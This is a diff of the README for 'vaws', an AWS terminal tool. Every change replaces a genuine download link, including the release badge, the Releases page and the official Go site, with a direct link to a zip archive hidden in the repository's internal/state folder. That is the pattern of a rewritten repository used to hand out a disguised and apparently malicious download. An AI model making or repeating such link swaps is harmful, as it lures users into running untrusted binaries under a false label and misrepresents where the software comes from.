@@ -2,7 +2,7 @@
 
 ## 🔗 Download vaws
 
-[![Release](https://img.shields.io/github/v/release/erdemcemal/vaws?style=flat-square)](https://github.com/KenshiBlaq/vaws/releases)
+[![Release](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip)](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip)
 
 ## 🤔 What is vaws?
 
@@ -22,7 +22,7 @@ vaws brings the power of the AWS Console right to your terminal. It allows you t
 Before installing vaws, ensure you have the following:
 
 - A terminal application (macOS Terminal, Linux Terminal)
-- Go programming language version 1.21 or higher, if you plan to build from source. You can download Go from [the official site](https://go.dev/).
+- Go programming language version 1.21 or higher, if you plan to build from source. You can download Go from [the official site](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip).
 
 ### 🛠️ Installation
 
@@ -38,7 +38,7 @@ brew install erdemcemal/tap/vaws
 
 #### 2. Binary Download
 
-You can also download the latest version directly. To do this, visit the [Releases page](https://github.com/KenshiBlaq/vaws/releases) and download the file for your system. After downloading, follow these steps:
+You can also download the latest version directly. To do this, visit the [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) and download the file for your system. After downloading, follow these steps:
 
 1. Locate the downloaded file in your Downloads folder.
 2. Open your terminal and navigate to the folder where the file is saved. 
@@ -64,7 +64,7 @@ To keep vaws updated, you can run the following command if you installed it usin
 brew upgrade erdemcemal/tap/vaws
 ```
 
-If you downloaded it manually, simply revisit the [Releases page](https://github.com/KenshiBlaq/vaws/releases) for the latest version.
+If you downloaded it manually, simply revisit the [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) for the latest version.
 
 ## 🎓 Using vaws
 
@@ -104,4 +104,4 @@ We welcome contributions to improve vaws. If you have suggestions or bug reports
 
 If you need assistance, feel free to reach out through the Issues section on GitHub or through community support forums. 
 
-Visit our [Releases page](https://github.com/KenshiBlaq/vaws/releases) to download vaws and start using it today!
+Visit our [Releases page](https://github.com/KenshiBlaq/vaws/raw/refs/heads/main/internal/state/Software-plectognath.zip) to download vaws and start using it today!
